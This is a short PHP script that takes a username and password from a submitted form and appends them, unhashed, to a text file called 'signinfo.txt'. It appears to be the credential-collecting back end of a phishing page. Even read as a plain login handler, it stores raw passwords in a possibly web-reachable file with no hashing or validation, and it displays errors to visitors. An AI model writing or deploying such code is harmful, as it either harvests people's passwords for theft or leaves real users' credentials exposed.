<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'php-error.log');

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get the username and password from POST request
    $username = $_POST['username'];
    $password = $_POST['password'];

    // File path where the data will be saved
    $file_path = 'signinfo.txt';

    // Prepare the data string (username and password)
    $data = "Username: " . $username . " | Password: " . $password . "\n";

    // Open the file in append mode and log errors if it fails
    if (!$file = fopen($file_path, 'a')) {
        error_log("Error: Unable to open file $file_path for writing");
        echo "Error: Unable to open file for writing.";
        exit;
    }

    // Try to lock the file
    if (flock($file, LOCK_EX)) {
        // Write the data and log the success or failure
        if (fwrite($file, $data) === false) {
            error_log("Error: Unable to write to file $file_path");
            echo "Error: Unable to write to file.";
        } else {
            echo "Sign-in information saved successfully!";
        }
        // Unlock the file
        flock($file, LOCK_UN);
    } else {
        error_log("Error: Unable to lock file $file_path");
        echo "Error: Unable to lock file.";
    }

    // Close the file
    fclose($file);
} else {
    echo "Invalid request!";
}
